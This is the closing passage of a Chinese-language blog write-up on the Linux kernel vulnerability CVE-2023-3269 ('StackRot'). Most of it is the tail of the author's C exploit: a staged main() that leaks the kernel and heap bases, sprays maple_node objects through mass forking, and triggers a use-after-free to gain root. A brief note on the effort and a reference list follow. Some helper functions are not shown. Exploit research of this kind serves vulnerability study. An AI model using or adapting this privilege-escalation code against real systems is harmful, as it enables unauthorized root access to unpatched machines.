&#125;<span class="hljs-keyword">else</span>&#123;<br>            perror(<span class="hljs-string">&quot;fork&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Failed to find fake stack.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span>&#123;<br><br>    *buffer = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">status_t</span> status;<br>    <span class="hljs-type">size_t</span> heapbase, kernelbase, fake_stack_addr;<br><br>    <span class="hljs-keyword">switch</span>(argc)&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\e[32m[+] Status: LEAK_KERNEL_BASE\e[0m&quot;</span>);<br>            status = LEAK_KERNEL_BASE;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\e[32m[+] Status: LEAK_HEAP_BASE\e[0m&quot;</span>);<br>            status = LEAK_HEAP_BASE;<br>            kernelbase = strtoull(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            detect_fake_stack(argv);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\e[32m[+] Status: DETECT_FAKE_STACK\e[0m&quot;</span>);<br>            status = DETECT_FAKE_STACK;<br>            heapbase = strtoull(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>            kernelbase = strtoull(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>            fake_stack_addr = strtoull(argv[<span class="hljs-number">3</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\e[32m[+] Status: UAFBR_TO_ROOT\e[0m&quot;</span>);<br>            status = UAFBR_TO_ROOT;<br>            heapbase = strtoull(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>            kernelbase = strtoull(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>            fake_stack_addr = strtoull(argv[<span class="hljs-number">3</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    save_status();<br><br>    pipe(pipefd[<span class="hljs-number">0</span>]);<br>    pipe(pipefd[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;PIPE_SPRAY_NUM; i++)&#123;<br>        <span class="hljs-keyword">if</span>(pipe(pipe_spray_pids[i]) == <span class="hljs-number">-1</span>)&#123;<br>            perror(<span class="hljs-string">&quot;pipe&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">pid_t</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid)&#123;<br>        bind_core(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">size_t</span> leak_base = read_worker(pid, status);<br>        <span class="hljs-keyword">if</span>(leak_base == <span class="hljs-number">-1</span>)&#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!] Failed to leak address.&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        sleep(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-built_in">snprintf</span>(buffer, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-string">&quot;%lx&quot;</span>, leak_base);<br>        <br>        <span class="hljs-keyword">if</span>(status == LEAK_KERNEL_BASE)<br>            execve(argv[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span> *[])&#123;argv[<span class="hljs-number">0</span>], buffer, <span class="hljs-literal">NULL</span>&#125;, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(status == LEAK_HEAP_BASE)<br>            execve(argv[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span> *[])&#123;argv[<span class="hljs-number">0</span>], argv[<span class="hljs-number">1</span>], buffer, <span class="hljs-literal">NULL</span>&#125;, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(status == DETECT_FAKE_STACK)<br>            <span class="hljs-built_in">exit</span>((<span class="hljs-type">int</span>)leak_base);<br>    &#125;<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">void</span> *tmp_addr = mmap(<br>        (<span class="hljs-type">void</span> *)<span class="hljs-number">0xcafe0000</span>,<br>        <span class="hljs-number">0x1000</span>,<br>        PROT_READ | PROT_WRITE,<br>        MAP_PRIVATE | MAP_ANONYMOUS,<br>        <span class="hljs-number">-1</span>, <span class="hljs-number">0</span><br>    );<br>    <span class="hljs-keyword">if</span>(tmp_addr == MAP_FAILED)&#123;<br>        perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <br>    <span class="hljs-type">void</span> *addrs[] = &#123;(<span class="hljs-type">void</span> *)<span class="hljs-number">0xcafe1000</span>, (<span class="hljs-type">void</span> *)<span class="hljs-number">0xcafe2000</span>&#125;;<br>    create_deep_path(<span class="hljs-string">&quot;bbbb&quot;</span>, addrs, <span class="hljs-number">2</span>);<br>    create_deep_path(<span class="hljs-string">&quot;dddddddddd&quot;</span>, (<span class="hljs-type">void</span> *[])&#123;(<span class="hljs-type">void</span> *)<span class="hljs-number">0x1000</span>&#125;, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;spray maple_node objects...\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;MAPLE_NODE_SPRAY_PAGE_NUM<span class="hljs-number">-8</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;MAPLE_NODE_SPRAY_PER_PAGE_NUM; j++)&#123;<br>            <span class="hljs-type">pid_t</span> pid = fork();<br>            <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)    simple_child();<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid &gt; <span class="hljs-number">0</span>)   maple_node_spray_pids[i][j] = pid;<br>            <span class="hljs-keyword">else</span>&#123;<br>                perror(<span class="hljs-string">&quot;fork&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            usleep(<span class="hljs-number">1000</span>);<br>        &#125;<br>    &#125;<br><br>    create_stack();<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=MAPLE_NODE_SPRAY_PAGE_NUM<span class="hljs-number">-8</span>; i&lt;MAPLE_NODE_SPRAY_PAGE_NUM; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;MAPLE_NODE_SPRAY_PER_PAGE_NUM; j++)&#123;<br>            <span class="hljs-type">pid_t</span> pid = fork();<br>            <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)    simple_child();<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid &gt; <span class="hljs-number">0</span>)   maple_node_spray_pids[i][j] = pid;<br>            <span class="hljs-keyword">else</span>&#123;<br>                perror(<span class="hljs-string">&quot;fork&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            usleep(<span class="hljs-number">1000</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;MAPLE_NODE_SPRAY_PAGE_NUM; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;MAPLE_NODE_SPRAY_PER_PAGE_NUM; j++)&#123;<br>            <br>            <span class="hljs-keyword">if</span>(kill(maple_node_spray_pids[i][j], SIGKILL) == <span class="hljs-number">-1</span>)&#123;<br>                perror(<span class="hljs-string">&quot;kill&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>            <br>            <span class="hljs-type">int</span> status;<br>            <span class="hljs-type">pid_t</span> ret = waitpid(maple_node_spray_pids[i][j], &amp;status, <span class="hljs-number">0</span>);<br>        <br>            <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">-1</span>) &#123;<br>                perror(<span class="hljs-string">&quot;waitpid&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span>(status)&#123;<br>        <span class="hljs-keyword">case</span> LEAK_KERNEL_BASE:<br>            trigger_uaf(<span class="hljs-number">0xfffffe0000000fec</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> LEAK_HEAP_BASE:<br>            trigger_uaf(kernelbase+HEAP_BASE_LEAK_OFFSET);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> UAFBR_TO_ROOT:<br>            trigger_uaf(fake_stack_addr);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DETECT_FAKE_STACK:<br>            trigger_uaf(fake_stack_addr);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>这一个洞从研究到手搓exp断断续续搞了两个星期，折磨但还挺有趣的，以及留下了很多待研究的问题</p>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ol>
<li><a target="_blank" rel="noopener" href="https://lore.kernel.org/lkml/20220906194824.2110408-1-Liam.Howlett@oracle.com/">https://lore.kernel.org/lkml/20220906194824.2110408-1-Liam.Howlett@oracle.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.kernel.org/core-api/maple_tree.html#overview">https://docs.kernel.org/core-api/maple_tree.html#overview</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.kernel.org/core-api/maple_tree.html#locking">https://docs.kernel.org/core-api/maple_tree.html#locking</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.kernel.org/core-api/maple_tree.html#advanced-api">https://docs.kernel.org/core-api/maple_tree.html#advanced-api</a></li>
<li><a target="_blank" rel="noopener" href="https://lore.kernel.org/linux-mm/20211201142918.921493-10-Liam.Howlett@oracle.com/">https://lore.kernel.org/linux-mm/20211201142918.921493-10-Liam.Howlett@oracle.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://lore.kernel.org/linux-mm/92ef4cae-ccfb-d952-6b36-71036329e8da@suse.cz/">https://lore.kernel.org/linux-mm/92ef4cae-ccfb-d952-6b36-71036329e8da@suse.cz/</a></li>
<li><a target="_blank" rel="noopener" href="https://lore.kernel.org/lkml/20230227173632.3292573-1-surenb@google.com/">https://lore.kernel.org/lkml/20230227173632.3292573-1-surenb@google.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9471f1f2f50282b9e8f59198ec6bb738b4ccc009">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9471f1f2f50282b9e8f59198ec6bb738b4ccc009</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/lrh2000/StackRot">https://github.com/lrh2000/StackRot</a></li>
<li><a target="_blank" rel="noopener" href="https://lore.kernel.org/lkml/20220906194824.2110408-1-Liam.Howlett@oracle.com/">https://lore.kernel.org/lkml/20220906194824.2110408-1-Liam.Howlett@oracle.com/</a></li>
</ol>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVEs/" class="category-chain-item">CVEs</a>
  
  
    <span>></span>
    
  <a href="/categories/CVEs/Linux-Kernel/" class="category-chain-item">Linux Kernel</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
      
        <a href="/tags/cve/" class="print-no-link">#cve</a>
      
        <a href="/tags/rcu/" class="print-no-link">#rcu</a>
      
        <a href="/tags/race-condition/" class="print-no-link">#race condition</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2023-3269 StackRot</div>
      <div>http://akaieurus.github.io/2026/02/28/cve-2023-3269/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Eurus</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2026年2月28日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2026/02/14/2045-rcu-analysis/" title="关于内核RCU类型UAF的可利用性的思考">
                        <span class="hidden-mobile">关于内核RCU类型UAF的可利用性的思考</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
